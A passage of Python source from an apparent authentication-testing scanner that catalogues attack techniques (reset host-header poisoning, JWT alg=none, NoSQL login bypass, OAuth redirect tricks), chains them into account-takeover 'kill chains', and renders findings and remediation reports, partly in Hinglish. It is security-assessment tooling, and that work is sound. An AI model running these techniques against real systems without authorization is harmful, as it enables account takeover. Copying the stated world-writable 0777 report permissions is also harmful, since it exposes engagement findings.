    # ---- v23 Stage Z: SSO grants + token binding + header posture ----
    for r in (results.get("sso_grants") or {}).get("rows", []):
        if r.get("risk_flags"):
            rows.append(_vrow("sso_implicit_grant", r.get("source", "-"),
                              "SUSPECTED", "oauth",
                              (r.get("risk_flags") or [])[:3]))
    if (results.get("token_binding") or {}).get("summary", {})\
            .get("indicators", 0) == 0:
        rows.append(_vrow("token_binding_absent", "census",
                          "INFO", "token_bind", ["no_dpop_mtls_marker"]))
    for r in (results.get("header_posture") or {}).get("rows", []):
        if r.get("verdict") == "WEAK":
            rows.append(_vrow("auth_header_posture_gap",
                              r.get("url", "-"), "SUSPECTED", "transport",
                              (r.get("missing") or [])[:4]))
    return rows


# ===========================================================================
# P21 STAGE U - TECHNIQUE MATRIX (210+ rows, 26 families, CWE+MITRE maps)
# ===========================================================================
def _mrow(fam, tech, det, sig, gated=False, cwe=None, mitre=None):
    return {"family": fam, "technique": tech, "detail": det,
            "signal": sig, "gated": bool(gated),
            "cwe": cwe or _FAMILY_CWE.get(fam, ["CWE-693"]),
            "mitre": mitre or _FAMILY_MITRE.get(fam, ["T1068"])}


def build_technique_matrix(results, conf):
    """210+ rows: static playbook + live census-driven signals (26 families)."""
    live = results.get("live") or {}
    el = results.get("enum_ladder") or {}
    rl = results.get("rl_report") or {}
    b2 = results.get("bypass2") or {}
    rr = results.get("reset_report") or {}
    md = results.get("mfa_deep") or {}
    od = results.get("oauth_deep") or {}
    ov = results.get("oauth_variants") or {}
    sd = results.get("saml_deep") or {}
    am = results.get("authz_matrix") or {}
    ht = results.get("header_trust") or {}
    cj = results.get("cors_report") or {}
    rd = results.get("redir_report") or {}
    ij = results.get("inj_report") or {}
    rg = results.get("reg_report") or {}
    lc = results.get("lifecycle") or {}
    pc = results.get("policy_captcha") or {}
    jr = results.get("jwt_report") or []
    rows = []
    _L = lambda x, y: "live" if x else "playbook"

    # ---- ENUM (12) ----
    for tech, det in [
        ("status-code differential", "200 vs 400 enum shape"),
        ("response-size differential", "body length oracle"),
        ("error-code oracle", "DRF/JSON error codes"),
        ("DRF-v2 shape fingerprint", "detail-field shape class"),
        ("timing oracle", "welch/MW/cliff's delta"),
        ("generic-message override", "same-message hardening check"),
        ("set-cookie rollover", "session rollover differential"),
        ("reset-existence leak", "reset flow user oracle"),
        ("registration-existence", "duplicate email oracle"),
        ("MFA-step oracle", "stage-2 pre-validation leak"),
        ("oauth user-info leak", "userinfo pre-consent shape"),
        ("sso email hint", "id_token/email pre-auth leak")]:
        rows.append(_mrow("ENUM", tech, det,
                          _L(el.get("confirmed_shapes"), "ENUM"), gated=False))
    # ---- LOCKOUT (8) ----
    for tech, det in [
        ("per-IP throttle", "IP-window lockout model"),
        ("per-account lockout", "account-window model"),
        ("global lockout", "shared-counter model"),
        ("progressive delay", "increasing backoff shape"),
        ("captcha-on-throttle", "captcha gate after N"),
        ("token-bucket", "bucket refill shape"),
        ("lockout-notification", "user-notify behaviour"),
        ("unlock-oracle", "unlock endpoint leak")]:
        rows.append(_mrow("LOCKOUT", tech, det, _L(rl, "LOCKOUT")))
    # ---- RESET (10) ----
    for tech, det in [
        ("host-header injection", "reset-link host poison"),
        ("x-original-url poison", "alt-header reset link"),
        ("token entropy census", "per-position entropy/Hamming"),
        ("token-reuse shape", "single-use enforcement"),
        ("generic-message check", "enumeration-safe message"),
        ("token-in-response", "response token disclosure"),
        ("token-in-url", "GET-token transport leak"),
        ("email-throw differential", "plausible-user probe (gated)"),
        ("short-token window", "short-lived token census"),
        ("recovery-code space", "backup code space shape")]:
        rows.append(_mrow("RESET", tech, det, _L(rr, "RESET"),
                          gated=("email-throw" in tech)))
    # ---- MFA (8) ----
    for name, _p in DOCUMENTED_MFA_TECHNIQUES:
        rows.append(_mrow("MFA", name, "documented-only technique",
                          _L(md.get("rows"), "MFA"),
                          gated=("FORBIDDEN" in _p or "brute" in name or
                                 "fatigue" in name)))
    # ---- JWT (12) ----
    for name, _p in DOCUMENTED_JWT_TECHNIQUES:
        rows.append(_mrow("JWT", name, "documented-only technique",
                          _L(jr, "JWT")))
    rows.append(_mrow("JWT", "pre-auth harvest", "token exposure pre-auth",
                      _L(jr, "JWT")))
    rows.append(_mrow("JWT", "claim sensitivity", "privilege claims plaintext",
                      _L([j for j in jr if j.get("privilege_claims")], "JWT")))
    rows.append(_mrow("JWT", "long-lived token", "lifetime > 24h window",
                      _L((results.get("jwt_deep") or {}).get("long_lived"),
                         "JWT")))
    # ---- OAUTH (14) ----
    for name, _p in DOCUMENTED_OAUTH_TECHNIQUES[:8]:
        rows.append(_mrow("OAUTH", name, "documented-only technique",
                          _L(od.get("rows"), "OAUTH")))
    for tech, det in [
        ("discovery-doc exposure", "openid-configuration open"),
        ("pkce-absent", "code_challenge missing"),
        ("state-absent", "csrf-state missing"),
        ("nonce-absent", "id_token nonce missing"),
        ("id_token claim census", "aud/azp/roles offline"),
        ("jwks cache census", "no-store missing on jwks"),
        ("variant redirect_uri", "allowlist shape probe (gated)"),
        ("error-shape oracle", "invalid_client differential"),
        ("grant census", "supported grant shapes")]:
        gated = tech == "variant redirect_uri"
        sig = _L(ov.get("rows") if gated else od.get("rows"), "OAUTH")
        rows.append(_mrow("OAUTH", tech, det, sig, gated=gated))
    # ---- SAML (6) ----
    for name, _p in DOCUMENTED_SAML_TECHNIQUES:
        rows.append(_mrow("SAML", name, "documented-only technique",
                          _L(sd.get("rows"), "SAML")))
    # ---- SESSION (10) ----
    for tech, det in [
        ("cookie flags", "secure/httponly/samesite"),
        ("__Host- prefix", "prefix rule violations"),
        ("duplicate cookie names", "session tossing shape"),
        ("session fixation", "pre-auth cookie reuse"),
        ("session rollover", "post-auth refresh check"),
        ("cookie entropy", "session id predictability"),
        ("remember-me entropy", "persistent token space"),
        ("logout invalidation", "server-side session kill"),
        ("concurrent sessions", "multi-session policy shape"),
        ("idle timeout", "expiry window census")]:
        rows.append(_mrow("SESSION", tech, det,
                          _L(results.get("cookie_report"), "SESSION")))
    # ---- TRANSPORT (6) ----
    for tech, det in [
        ("cleartext login", "http:// auth endpoints"),
        ("cleartext reset", "http:// reset endpoints"),
        ("weak scheme basic", "WWW-Authenticate Basic"),
        ("weak scheme ntlm", "NTLM exposure"),
        ("hsts missing", "Strict-Transport-Security"),
        ("mixed-content token", "token over http transport")]:
        rows.append(_mrow("TRANSPORT", tech, det,
                          _L(results.get("live"), "TRANSPORT")))
    # ---- CORS (5) ----
    for tech, det in [
        ("origin reflect", "arbitrary origin echo"),
        ("credentials reflect", "ACAC true + reflect"),
        ("wildcard", "ACAO * on auth"),
        ("null-origin", "null origin accepted"),
        ("suborigin echo", "suborigin reflection shape")]:
        rows.append(_mrow("CORS", tech, det, _L(cj, "CORS")))
    # ---- REDIRECT (6) ----
    for tech, det in [
        ("open-redirect param", "next/redirect/target"),
        ("protocol-relative", "//canary shape"),
        ("url-encoded", "%2F%2F shape"),
        ("referer-reflection", "referrer leak"),
        ("crlf injection", "%0d%0a header shape"),
        ("meta-refresh", "html meta redirect shape")]:
        rows.append(_mrow("REDIRECT", tech, det, _L(rd, "REDIRECT")))
    # ---- INJECT (10) ----
    for tech, det in [
        ("nosql operator", "$ne/$gt login bypass shape"),
        ("nosql regex", "$regex oracle"),
        ("type-confusion", "array/object field types"),
        ("hpp", "duplicate param differential"),
        ("content-type flip", "form vs json behaviour"),
        ("ldap-shape", "ldap filter injection hint"),
        ("xpath-shape", "xpath injection hint"),
        ("orm-shape", "orm error oracle"),
        ("error-based oracle", "stack/error differential"),
        ("blind-shape", "boolean differential")]:
        rows.append(_mrow("INJECT", tech, det, _L(ij, "INJECT")))
    # ---- HEADER_TRUST (6) ----
    for hname, _v in HEADER_TRUST_HEADERS:
        hits = [r for r in (ht.get("rows") or [])
                if r.get("header") == hname]
        rows.append(_mrow("HEADER_TRUST", "canary-%s" % hname,
                          "trusted header echo census",
                          "win" if hits else _L(ht.get("rows"), "HT")))
    # ---- REGISTRATION (6) ----
    for tech, det in [
        ("open registration", "public signup surface"),
        ("duplicate-email oracle", "existence leak"),
        ("weak policy", "min-length/complexity"),
        ("username-variants", "normalization bypass"),
        ("pre-account-takeover", "unverified email claim"),
        ("invite-code space", "invite token census")]:
        rows.append(_mrow("REGISTRATION", tech, det, _L(rg, "REG"),
                          gated=("takeover" in tech)))
    # ---- AUTHZ (12) ----
    for tech, det in [
        ("vertical pre-auth", "admin path pre-auth census"),
        ("horizontal id-diff", "canary A vs B differential"),
        ("role-param echo", "role canary reflection"),
        ("mass-assign role", "role field acceptance shape"),
        ("id-path census", "user/N path exposure"),
        ("api-admin path", "api/v1/admin shape"),
        ("panel-link leak", "admin links pre-auth"),
        ("privilege-target ff", "P20/P11 feedforward"),
        ("jwt-role trust", "role-claim only authz"),
        ("method-diff", "GET vs POST authz parity"),
        ("trailing-slash diff", "/admin/ vs /admin"),
        ("case-diff", "/Admin case differential")]:
        rows.append(_mrow("AUTHZ", tech, det, _L(am.get("ran"), "AUTHZ"),
                          gated=not bool(am.get("ran"))))
    # ---- POLICY (6) ----
    for tech, det in [
        ("min-length weak", "< 8 chars policy"),
        ("no-complexity", "class rule absent"),
        ("breached-allow", "common passwords accept shape"),
        ("history-check", "password-reuse policy"),
        ("rotation-policy", "forced rotation shape"),
        ("hint-exposure", "password hint leak")]:
        rows.append(_mrow("POLICY", tech, det,
                          _L((pc.get("policy_rows") or []), "POLICY")))
    # ---- CAPTCHA (4) ----
    for tech, det in [
        ("captcha-absent", "no anti-auto marker"),
        ("captcha-client-only", "client-side gate"),
        ("captcha-replay", "token reuse shape"),
        ("captcha-coverage", "which flows protected")]:
        rows.append(_mrow("CAPTCHA", tech, det,
                          _L((pc.get("captcha_rows") or []), "CAPTCHA")))
    # ---- LIFECYCLE (6) ----
    for tech, det in [
        ("refresh-endpoint shape", "refresh/grant census"),
        ("refresh-rotation", "reuse-window shape (gated)"),
        ("remember-me entropy", "persistent cookie space"),
        ("logout-cookie clear", "logout cookie shape"),
        ("logout-state live", "post-logout session"),
        ("fixation shape", "pre-auth set-cookie")]:
        rows.append(_mrow("LIFECYCLE", tech, det, _L(lc, "LIFE"),
                          gated=("rotation" in tech)))
    # ---- SSO_LOGOUT (4) ----
    for tech, det in [
        ("front-channel logout", "fci supported census"),
        ("back-channel logout", "bci supported census"),
        ("end-session open", "end_session_endpoint shape"),
        ("slo-binding", "SingleLogout binding census")]:
        rows.append(_mrow("SSO_LOGOUT", tech, det,
                          _L((od.get("discovery") or []), "SSO")))
    # ---- BYPASS2 (17 secret request-shapes) ----
    for name, mutation, cls in BYPASS2_AUTH_SHAPES:
        wins = [r for r in (b2.get("rows") or [])
                if r.get("variant") == name and r.get("nontrivial")]
        rows.append(_mrow("BYPASS2", name, "%s census" % cls,
                          "win" if wins else _L(b2.get("ran"), "B2"),
                          gated=not bool(b2.get("ran"))))
    # ---- HIDPARAM (8) ----
    for pname in ("admin", "role", "debug", "test", "internal",
                  "is_admin", "user_id", "debug_mode"):
        rows.append(_mrow("HIDPARAM", "canary-%s" % pname,
                          "hidden param echo census", "playbook",
                          gated=True))
    # ---- CHAIN (6) ----
    for tech, det in [
        ("enum->stuffing", "enum + no-ratelimit chain"),
        ("reset->takeover", "host-header + token leak"),
        ("oauth->ato", "loose redirect + code"),
        ("jwt->privesc", "weak alg + role claim"),
        ("authz->idor", "vertical open + id path"),
        ("mfa->brute", "no-ratelimit + small otp")]:
        rows.append(_mrow("CHAIN", tech, det, _L(results.get("chains"),
                                                 "CHAIN")))
    # ---- v23 PWD_HYGIENE (7) ----
    for tech, det in [
        ("maxlength-cap", "short maxlength accepts weak secrets"),
        ("no-complexity-rule", "pattern/complexity missing"),
        ("autocomplete-on", "password field autocomplete on/unspecified"),
        ("cleartext-post", "form posts over http"),
        ("breached-allow", "common passwords accept shape"),
        ("rotation-absent", "no forced rotation shape"),
        ("hygiene-composite", "per-form hygiene score census")]:
        rows.append(_mrow("PWD_HYGIENE", tech, det,
                          _L((results.get("pwd_hygiene") or {}).get("rows"),
                             "PWD")))
    # ---- v23 RECOVERY (6) ----
    for tech, det in [
        ("kba-security-questions", "guessable secret questions"),
        ("backup-code-space", "backup code entropy/space shape"),
        ("recovery-link-host-poison", "recovery link host injection (gated)"),
        ("unlock-oracle", "account unlock endpoint leak"),
        ("mfa-reset-flow", "mfa reset path census"),
        ("recovery-enum", "recovery existence oracle")]:
        rows.append(_mrow("RECOVERY", tech, det,
                          _L((results.get("recovery") or {}).get("rows"),
                             "REC"),
                          gated=("host-poison" in tech)))
    # ---- v23 TOKEN_BIND (6) ----
    for tech, det in [
        ("dpop-absent", "DPoP proof indicator missing"),
        ("mtls-absent", "mTLS cert-bound token indicator missing"),
        ("token-binding-header", "Sec-Token-Binding header absent"),
        ("cnf-claim-absent", "cnf confirmation claim absent"),
        ("cert-bound-absent", "cert-bound token shape absent"),
        ("replay-window", "bearer replay window (documented)")]:
        rows.append(_mrow("TOKEN_BIND", tech, det,
                          _L((results.get("token_binding") or {}).get("rows"),
                             "TBIND")))
    # ---- v23 STUFFING (6) ----
    for tech, det in [
        ("resistance-open", "stuffing posture OPEN (<=2/6)"),
        ("resistance-partial", "stuffing posture PARTIAL (3-4/6)"),
        ("breach-replay-defense", "breach-password deny-list shape"),
        ("velocity-check-absent", "login velocity anomaly check absent"),
        ("password-deny-list-absent", "common-password denylist absent"),
        ("stuffing-composite", "composite stuffing resistance census")]:
        rows.append(_mrow("STUFFING", tech, det,
                          _L((results.get("stuffing_posture") or {})
                             .get("rows"), "STF")))
    # ---- v23 live extras (rememberme/session props matrix rows) ----
    for r in (results.get("rememberme") or {}).get("rows", [])[:2]:
        rows.append(_mrow("LIFECYCLE", "persist-cookie:%s" % r.get("cookie"),
                          "v23 persistent-cookie census",
                          "live:%s" % r.get("lifetime_bucket")))
    for r in (results.get("session_props") or {}).get("rows", [])[:2]:
        rows.append(_mrow("SESSION", "cookie-prop:%s" % r.get("name"),
                          "v23 session property matrix",
                          "live:%s" % r.get("verdict")))
    return rows


# ===========================================================================
# P21 STAGE T - KILL CHAINS (24 auth-specific chains + cross-module census)
# ===========================================================================
_AUTH_CHAINS = [
    ("CH01", "enum->stuffing", ["enum_ladder_confirmed", "no_rate_limit"],
     "enum oracle + no throttle -> credential stuffing ready", "critical"),
    ("CH02", "lockout-bypass->brute", ["lockout_bypass"],
     "bypass matrix win -> brute-force window", "critical"),
    ("CH03", "bypass2->stuffing", ["bypass2_shape_win"],
     "request-shape differential -> throttle evasion", "high"),
    ("CH04", "reset-host->ato", ["reset_host_header"],
     "host-header poison -> reset link interception -> ATO", "critical"),
    ("CH05", "reset-token->ato", ["reset_token_weak"],
     "weak token -> predict -> reset ATO", "critical"),
    ("CH06", "reset-enum->phish", ["reset_enumeration"],
     "reset existence oracle -> targeted phishing", "medium"),
    ("CH07", "mfa-oracle->brute", ["mfa_status_oracle", "mfa_entropy_weak"],
     "state leak + small OTP space -> MFA bypass", "critical"),
    ("CH08", "mfa-noratelimit->brute", ["mfa_rate_limited"],
     "no OTP throttle -> brute window (documented)", "high"),
    ("CH09", "oauth-redirect->code", ["oauth_variant_accepted"],
     "loose redirect_uri -> code interception", "critical"),
    ("CH10", "oauth-nostate->csrf", ["oauth_state_absent"],
     "missing state -> login CSRF attach", "high"),
    ("CH11", "oauth-nopkce->code", ["oauth_pkce_absent"],
     "no PKCE -> authorization-code interception", "high"),
    ("CH12", "oauth-idtoken->claims", ["oauth_idtoken_claims"],
     "role/aud claims misuse -> privilege confusion", "medium"),
    ("CH13", "jwt-none->ato", ["jwt_alg_none_shape"],
     "alg=none shape -> forged token ATO", "critical"),
    ("CH14", "jwt-confusion->ato", ["jwt_alg_confusion_candidate"],
     "HS256/RS256 confusion -> forged token", "critical"),
    ("CH15", "jwt-jku->key-spoof", ["jwt_jku_shape"],
     "kid/jku injection -> attacker key trust", "high"),
    ("CH16", "authz-vertical->admin", ["authz_vertical_preauth"],
     "pre-auth admin path -> privileged access", "critical"),
    ("CH17", "authz-horizontal->idor", ["authz_horizontal_diff"],
     "canary diff -> horizontal escalation (P11 feed)", "critical"),
    ("CH18", "header-trust->authz", ["header_xff_trusted",
                                     "header_original_url_echo"],
     "trusted header -> authz bypass", "high"),
    ("CH19", "cors->token-theft", ["cors_cred_reflection"],
     "origin reflect + creds -> token theft", "critical"),
    ("CH20", "redirect->token-leak", ["auth_open_redirect"],
     "open redirect -> fragment token leak", "high"),
    ("CH21", "nosql->login-bypass", ["nosql_operator_accepted"],
     "operator accept -> auth bypass", "critical"),
    ("CH22", "lifecycle->session-hijack", ["lifecycle_remember_predictable",
                                           "sso_logout_live"],
     "predictable persist cookie / live logout state -> hijack", "high"),
    ("CH23", "pre-ato-registration", ["pretakeover_shape"],
     "unverified email claim -> pre-account takeover", "critical"),
    ("CH24", "policy->stuffing", ["policy_min_length_weak",
                                  "captcha_absent_auth"],
     "weak policy + no captcha -> stuffing-friendly", "medium"),
    ("CH25", "pwd-hygiene->spray", ["pwd_hygiene_weak",
                                    "no_rate_limit"],
     "weak password hygiene + no throttle -> password spray window", "high"),
    ("CH26", "rememberme->hijack", ["rememberme_long_lived",
                                    "session_property_gap"],
     "long-lived persist cookie + weak flags -> session hijack", "high"),
    ("CH27", "recovery->ato", ["recovery_kba_present",
                               "reset_enumeration"],
     "KBA recovery + account enum -> targeted recovery ATO", "critical"),
    ("CH28", "sso-implicit->token-leak", ["sso_implicit_grant",
                                          "auth_open_redirect"],
     "implicit grant + open redirect -> token leak", "critical"),
]


def build_auth_chains(F, results, meta, conf):
    """Chain rows + F.add CONFIRMED entries. Verdict engine rows ko source
    keys se match karta hai; cross-module feedforward census bhi."""
    vkeys = {}
    for r in (results.get("verdict_rows") or []):
        vkeys.setdefault(r.get("key"), []).append(r)
    chains = []
    for cid, name, needs, impact, sev in _AUTH_CHAINS:
        present = [k for k in needs if vkeys.get(k)]
        if not present:
            continue
        chain = {"id": cid, "name": name, "needs": needs,
                 "present": present, "impact": impact,
                 "severity": sev,
                 "completeness": "%d/%d" % (len(present), len(needs)),
                 "verdict": "CONFIRMED" if len(present) == len(needs)
                 else "SUSPECTED"}
        chains.append(chain)
        if chain["verdict"] == "CONFIRMED":
            tgt = (vkeys[present[0]][0].get("target") or "-")
            F.add("auth_kill_chain_%s" % cid.lower(),
                  "Kill-chain %s (%s): %s" % (cid, name, impact),
                  tgt, "needs=%s all present" % ",".join(needs),
                  evidence_ref="auth_kill_chains.json")
    # ---- cross-module census (0 probes) ----
    cross = []
    ff = results.get("ff") or {}
    if _ff_flag(ff, "access", "to_phase21_authz"):
        cross.append({"module": "access (P11)", "shape": "idor targets feed"})
    if _ff_flag(ff, "logic", "to_phase21_authz"):
        cross.append({"module": "logic (P20)",
                      "shape": "privileged targets feed"})
    if _ff_flag(ff, "inject", "to_phase21_authz"):
        cross.append({"module": "inject (P12)", "shape": "bypass2 variants"})
    if _ff_flag(ff, "sessions", "to_phase21_authz"):
        cross.append({"module": "sessions (P10)", "shape": "session flags"})
    results["chains_crossref"] = cross
    return chains


# ===========================================================================
# P21 REPORT RENDERERS (v22 standard: findings/plan/remediation/kickoff/exec)
# ===========================================================================
def _matrix_txt(matrix):
    lines = ["P21 AUTH TECHNIQUE MATRIX v%s - %d rows x 26 families"
             % (PLAN_VERSION, len(matrix)),
             "=" * 78,
             "%-14s %-30s %-9s %-7s %s" % ("FAMILY", "TECHNIQUE", "SIGNAL",
                                           "GATED", "CWE"),
             "-" * 78]
    for r in matrix:
        lines.append("%-14s %-30s %-9s %-7s %s" % (
            r["family"][:14], r["technique"][:30], r["signal"][:9],
            "yes" if r["gated"] else "-", ",".join(r["cwe"])))
    lines.append("-" * 78)
    sig = {}
    for r in matrix:
        sig[r["signal"]] = sig.get(r["signal"], 0) + 1
    lines.append("signals: %s" % json.dumps(sig, default=str))
    return "\n".join(lines)


def _sev_mix(rows):
    mix = {}
    for r in rows:
        mix[r.get("verdict", "?")] = mix.get(r.get("verdict", "?"), 0) + 1
    return mix


def _findings_md(scope, F, ctx, meta, results):
    L = ["# P21 Authentication & Authorization Findings (v%s)" % PLAN_VERSION,
         "",
         "- engagement: `%s`" % scope.engagement,
         "- mode: %s" % ("PASSIVE-ONLY" if ctx.get("passive") else "active"),
         "- probes: %s | budget inherited: wasp_core" % meta.get("probes_total", 0),
         "- verdict mix: %s" % json.dumps(_sev_mix(results.get("verdict_rows")
                                                   or []), default=str),
         "",
         "| # | title | target | severity |",
         "|---|-------|--------|----------|"]
    for i, f in enumerate(F.items, 1):
        L.append("| %d | %s | `%s` | %s |" % (
            i, truncate(str(f.get("title", "")), 70),
            truncate(str(f.get("target", "-")), 60),
            classify_severity(f.get("title", "") + " " +
                              str(f.get("detail", "")))))
    if not F.items:
        L.append("| - | koi finding nahi (INERT census clean) | - | - |")
    L.append("")
    L.append("## Verdict rows (top)")
    L.append("")
    L.append("| key | target | verdict | stage |")
    L.append("|-----|--------|---------|-------|")
    for r in (results.get("verdict_rows") or [])[:30]:
        L.append("| %s | `%s` | %s | %s |" % (
            r.get("key"), truncate(str(r.get("target", "-")), 50),
            r.get("verdict"), r.get("stage")))
    L.append("")
    L.append("## Kill chains")
    L.append("")
    for c in (results.get("chains") or []):
        L.append("- **%s %s** [%s] (%s) - %s" % (
            c["id"], c["name"], c["verdict"], c["completeness"],
            c["impact"]))
    if not (results.get("chains") or []):
        L.append("- (koi chain trigger nahi hua)")
    L.append("")
    return "\n".join(L)


def _test_plan_md(results, verdict_rows, conf):
    L = ["# P21 Auth Test Plan (v%s) - RoE-first" % PLAN_VERSION, "",
         "PLAN_VERSION: %s | gates default OFF (RoE) | canary family: %s"
         % (PLAN_VERSION, CANARY), "",
         "| stage | census | verdict rows |", "|-------|--------|--------------|"]
    stages = [("A surface", "discovery+ff"), ("B probe-map", "read-only GET"),
              ("C transport/cookies", "passive census"),
              ("D jwt-deep", "offline+tamper-gated"),
              ("E inject-oracle", "gated budget"),
              ("F enum-ladder", "canary shapes"),
              ("G rate/lockout/bypass2", "gated 17-shapes"),
              ("H reset-flow", "gated host-header"),
              ("I mfa-deep", "gated replay"),
              ("J oauth-deep", "GET census"),
              ("K oauth-variants", "gated redirect"),
              ("L saml", "metadata census"),
              ("M authz-matrix", "gated differential"),
              ("N header-trust", "canary echo"),
              ("O cors/redirect", "gated probes"),
              ("P registration", "gated takeover"),
              ("Q lifecycle", "GET-shape census"),
              ("R policy/captcha", "marker census")]
    for s, c in stages:
        n = sum(1 for r in verdict_rows if r.get("stage", "").startswith(
            s.split()[0].lower()[:4]))
        L.append("| %s | %s | %d |" % (s, c, n))
    L.append("")
    L.append("## Documented-only playbooks (execution FORBIDDEN w/o RoE wave)")
    for fam, cat in (("MFA", DOCUMENTED_MFA_TECHNIQUES),
                     ("SAML", DOCUMENTED_SAML_TECHNIQUES),
                     ("OAUTH", DOCUMENTED_OAUTH_TECHNIQUES),
                     ("JWT", DOCUMENTED_JWT_TECHNIQUES)):
        for name, d in cat:
            L.append("- [%s] %s - %s" % (fam, name, d))
    L.append("")
    return "\n".join(L)


def _remediation_txt(verdict_rows):
    REM = {
        "enum_ladder_confirmed": "Enumeration: sab auth errors ka ek generic "
        "response (same status/size/timing) + server-side jitter.",
        "no_rate_limit": "Rate-limit: token-bucket per-account+per-IP + "
        "progressive delay + captcha on Nth attempt.",
        "lockout_bypass": "Lockout: bypass-shape normalize karo (xff strip, "
        "path normalize) + canary fingerprint block.",
        "bypass2_shape_win": "Request normalization harden karo: case/encode/"
        "header canonicalization parser-level.",
        "reset_host_header": "Reset links: server-configured host only - "
        "request Host/X-Forwarded-* ignore.",
        "reset_token_weak": "Reset tokens: >=32 bytes CSPRNG, single-use, "
        "short TTL, hashed-at-rest.",
        "mfa_status_oracle": "MFA: verify endpoint ka response generic rakho "
        "aur state server-side rakho.",
        "mfa_entropy_weak": "OTP: >=6 digits CSPRNG + 5-attempt cap + "
        "single-use + 60s TTL.",
        "oauth_pkce_absent": "OAuth: PKCE S256 mandatory (public clients).",
        "oauth_state_absent": "OAuth: state mandatory + server-side session "
        "bind.",
        "oauth_variant_accepted": "redirect_uri: exact-match allowlist + "
        "string compare (no parsing games).",
        "oauth_error_shape": "OAuth errors: uniform error shape for invalid "
        "client/redirect.",
        "authz_vertical_preauth": "Authz: deny-by-default middleware on "
        "privileged paths + integration tests.",
        "authz_horizontal_diff": "Authz: object-level checks (owner bind) "
        "har id-path par.",
        "header_xff_trusted": "Header trust: XFF sirf known-proxy se accept, "
        "X-Original-URL disable.",
        "cors_cred_reflection": "CORS: origin allowlist + ACAC true sirf "
        "trusted origins par.",
        "auth_open_redirect": "Redirects: allowlist + no user-controlled "
        "absolute URLs.",
        "nosql_operator_accepted": "Input sanitization: typed params + ORM "
        "bind, raw operator strings reject.",
        "jwt_alg_none_shape": "JWT: alg allowlist server-side, none/HS256-"
        "confusion reject, kid whitelist.",
        "cleartext_auth_transport": "HTTPS-only + HSTS preload on auth "
        "endpoints.",
        "cookie_flags_missing": "Cookies: Secure+HttpOnly+SameSite + "
        "__Host- prefix.",
        "sso_logout_live": "Logout: server-side session revoke + cookie "
        "clear + SLO propagate.",
        "lifecycle_remember_predictable": "Remember-me: CSPRNG token, "
        "hashed-at-rest, rotation on use.",
        "captcha_absent_auth": "Anti-auto: server-enforced captcha/risk "
        "engine on login/register/reset.",
        "policy_min_length_weak": "Password policy: >=12 length + "
        "breach-list check + no forced rotation.",
        "saml_metadata_open": "SAML: metadata access restrict + signed "
        "assertions mandatory.",
    }
    lines = ["P21 REMEDIATION GUIDE (v%s)" % PLAN_VERSION, "=" * 72]
    seen = set()
    for r in verdict_rows:
        if r.get("verdict") not in ("CONFIRMED", "SUSPECTED"):
            continue
        rem = REM.get(r.get("key"))
        if not rem or rem in seen:
            continue
        seen.add(rem)
        lines.append("* [%s] %s\n    -> %s" % (r.get("key"), r.get("target",
                                                                 "-"), rem))
    if len(seen) == 0:
        lines.append("* koi remediable verdict nahi (HARDENED/INFO only)")
    return "\n".join(lines)


def _kickoff_md(results, conf):
    L = ["# P21 Manual Kickoff Guide (v%s)" % PLAN_VERSION, "",
         "Automation ne INERT census complete kar liya. Neeche wahi techniques",
         "jo RoE wave me MANUAL ki jaati hain (execution automation se "
         "FORBIDDEN):", ""]
    L.append("## MFA wave")
    for n, d in DOCUMENTED_MFA_TECHNIQUES:
        L.append("- %s - %s" % (n, d))
    L.append("")
    L.append("## SAML wave (XSW)")
    for n, d in DOCUMENTED_SAML_TECHNIQUES:
        L.append("- %s - %s" % (n, d))
    L.append("")
    L.append("## OAuth wave")
    for n, d in DOCUMENTED_OAUTH_TECHNIQUES:
        L.append("- %s - %s" % (n, d))
    L.append("")
    L.append("## JWT wave")
    for n, d in DOCUMENTED_JWT_TECHNIQUES:
        L.append("- %s - %s" % (n, d))
    L.append("")
    L.append("## Gated census replay")
    L.append("- config.json me gates ON karo: auth_allow_authz_matrix, "
             "auth_allow_oauth_variant_probe, auth_allow_bypass2_matrix, "
             "auth_allow_mfa_replay_probe, auth_allow_pretakeover_probe")
    L.append("- phir module dobara run karo - gated stages cap ke andar "
             "census karenge (canary-only, sequential)")
    return "\n".join(L)


def _exec_md(scope, F, ctx, meta, results, conf):
    verdict_rows = results.get("verdict_rows") or []
    confirmed = [r for r in verdict_rows if r.get("verdict") == "CONFIRMED"]
    suspected = [r for r in verdict_rows if r.get("verdict") == "SUSPECTED"]
    chains = results.get("chains") or []
    crit_chains = [c for c in chains if c.get("severity") == "critical"]
    L = ["# P21 Authentication & Authorization - Executive Summary", "",
         "- engagement: `%s`" % scope.engagement,
         "- plan: v%s | mode: %s | probes: %s"
         % (PLAN_VERSION, "passive" if ctx.get("passive") else "active",
            meta.get("probes_total", 0)),
         "- findings: %d | verdict CONFIRMED: %d | SUSPECTED: %d"
         % (len(F.items), len(confirmed), len(suspected)),
         "- kill-chains: %d (critical: %d)" % (len(chains), len(crit_chains)),
         "",
         "## Top risks",
         ""]
    for c in crit_chains[:5]:
        L.append("1. **%s %s** - %s" % (c["id"], c["name"], c["impact"]))
    if not crit_chains:
        L.append("1. (koi critical chain trigger nahi hua)")
    L.append("")
    L.append("## Gate status")
    for g in ("auth_allow_authz_matrix", "auth_allow_oauth_variant_probe",
              "auth_allow_bypass2_matrix", "auth_allow_mfa_replay_probe",
              "auth_allow_pretakeover_probe"):
        L.append("- %s = %s" % (g, "ON" if conf.get(g) else
                                "OFF (documented-only)"))
    L.append("")
    L.append("## Static posture (hardened surfaces)")
    for r in verdict_rows:
        if r.get("verdict") == "HARDENED":
            L.append("- %s @ `%s`" % (r.get("key"), r.get("target", "-")))
    if not any(r.get("verdict") == "HARDENED" for r in verdict_rows):
        L.append("- (census me koi hardened signal record nahi hua)")
    return "\n".join(L)


# ===========================================================================
# P21 STAGE V - WRITE REPORTS v23 (55 artifacts + manifest + feedforward)
# ===========================================================================
def write_reports(out, scope, F, ctx, meta=None, results=None, conf=None):
    """P21 v23 report set - sab RWX 0777. Returns manifest file list."""
    meta = meta or {}
    results = results or {}
    conf = conf or {}
    manifest = []

    def _w_json(name, obj):
        _rwx_save_json(os.path.join(out, name), obj)
        manifest.append(name)

    def _w_text(name, txt):
        _rwx_save_text(os.path.join(out, name), txt)
        manifest.append(name)

    # ---- core artifacts (v10 compatible names + v22 additions) ----
    _w_text("auth_endpoints.txt", "\n".join(
        "%-6s %-8s %s" % (r.get("priority"), r.get("confidence", "-"),
                          r.get("url", ""))
        for r in (results.get("ranked") or [])))
    _w_json("auth_surface.json", results.get("probes") or {})
    _w_json("auth_buckets.json", results.get("buckets") or {})
    _w_json("auth_feedforward_in.json", results.get("ff") or {})
    _w_json("auth_param_census.json", results.get("param_census") or [])
